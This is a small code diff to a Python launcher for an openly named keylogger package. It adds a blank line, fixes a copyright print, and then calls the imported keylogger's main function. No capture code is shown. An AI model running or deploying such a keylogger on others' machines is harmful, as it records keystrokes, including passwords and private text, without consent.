@@ -23,6 +23,7 @@
 This file implements a keylogger.
 """
 
+
 __version__ = "1.0.0"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
@@ -48,5 +49,5 @@ try:
 except ImportError:
     from KeyLogger import main as keySpy
 
-print(copyright)
+print(__copyright__)
 keySpy()
